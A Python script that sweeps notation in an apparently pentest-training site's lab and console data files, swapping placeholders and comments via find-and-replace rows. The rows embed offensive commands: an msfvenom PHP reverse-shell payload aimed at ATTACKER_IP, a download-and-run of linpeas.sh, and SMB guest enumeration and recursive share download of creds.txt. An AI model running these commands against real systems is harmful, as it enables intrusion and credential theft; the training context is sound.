#!/usr/bin/env python3
"""fix_notation.py - final notation sweep across labs + console.

Same contract as fix_snippets.py / fix_dossiers.py: each row is
(file, unique_needle, replacement); a needle that is missing or ambiguous
aborts the run instead of writing. Dry-run by default, --apply writes.

Scope: the last real findings from tools/audit_sections.js after the
heredoc / python-named-group false positives were filtered out:
  * console `syn` values with an inline comment after the command
  * angle-bracket placeholders inside lab evidence/usage lines
  * trailing whitespace on lab evidence lines
"""
import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
APPLY = "--apply" in sys.argv

ROWS = [
    # ---- console synopsis: one real command, notes belong in tips ----
    ("assets/data-terminal.js",
     "curl -L URL | sh          # or copy it over, chmod +x, then run",
     "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh\\n"
     "chmod +x linpeas.sh && ./linpeas.sh -a"),
    ("assets/data-terminal.js",
     "sudo -l   # then sudo -l | grep -i nopasswd",
     "sudo -l\\nsudo -l | grep -i nopasswd"),

    # ---- lab placeholders -> real UPPER tokens ----
    ("assets/data-labs.js",
     "#   msfvenom -p php/reverse_php LHOST=<your-lab-ip> LPORT=443 -f raw -o shell.php",
     "#   msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=443 -f raw -o shell.php"),
    ("assets/data-labs.js",
     "- Evidence: nxc smb <ip> -u guest -p '' --shares  -> SHARE READ,WRITE",
     "- Evidence: nxc smb TARGET_IP -u guest -p '' --shares  -> SHARE READ,WRITE"),
    ("assets/data-labs.js",
     "- Evidence: smbclient -N //<ip>/SHARE -c 'recurse ON; mget *'  -> creds.txt",
     "- Evidence: smbclient -N //TARGET_IP/SHARE -c 'recurse ON; mget *'  -> creds.txt"),
    ("assets/data-labs2.js",
     "Author: <you>            Dates:",
     "Author: YOUR NAME        Dates:"),
    ("assets/data-labs2.js",
     "# zrecon <target> — scan, enumerate, rank. Logs to ./zrecon-<target>-<ts>/",
     "# zrecon TARGET — scan, enumerate, rank. Logs to ./zrecon-TARGET-$(date +%s)/"),
    ("assets/data-labs2.js",
     '[ $# -ge 1 ] || { echo "usage: zrecon <ip|cidr>"; exit 2; }',
     '[ $# -ge 1 ] || { echo "usage: zrecon TARGET_OR_CIDR"; exit 2; }'),
    ("assets/data-labs2.js",
     "# zsmb <target> [-u user -p pass] — scoped, logged nxc smb wrapper with my defaults",
     "# zsmb TARGET [-u USER -p PASS] — scoped, logged nxc smb wrapper with my defaults"),
    ("assets/data-labs2.js",
     'T="\\${1:?usage: zsmb <target> [-u u -p p]}"; shift || true',
     'T="\\${1:?usage: zsmb TARGET [-u USER -p PASS]}"; shift || true'),

    # ---- trailing whitespace inside evidence blocks ----
    ("assets/data-labs.js", "- SaaS in use (from TXT/DMARC): \n", "- SaaS in use (from TXT/DMARC):\n"),
    ("assets/data-labs.js", "- Set Kerberos preauth on all accounts (class 2) \n", "- Set Kerberos preauth on all accounts (class 2)\n"),
    ("assets/data-labs2.js", "Defender view (auditd/syslog): \n", "Defender view (auditd/syslog):\n"),
]


def main():
    done = 0
    for rel, needle, repl in ROWS:
        path = os.path.join(ROOT, rel)
        text = open(path, encoding="utf-8").read()
        n = text.count(needle)
        if repl in text and n == 0:
            print("-- already applied: %s :: %s" % (rel, needle[:50]))
            continue
        if n != 1:
            print("!! needle matched %d times in %s: %r" % (n, rel, needle[:70]))
            sys.exit(2)
        print("%s\n  - %s\n  + %s" % (rel, needle.replace("\n", "\\n")[:95], repl.replace("\n", "\\n")[:95]))
        if APPLY:
            open(path, "w", encoding="utf-8").write(text.replace(needle, repl, 1))
        done += 1
    print("\nrows: %d   resolved: %d   mode: %s" % (len(ROWS), done, "APPLY" if APPLY else "dry-run"))


if __name__ == "__main__":
    main()
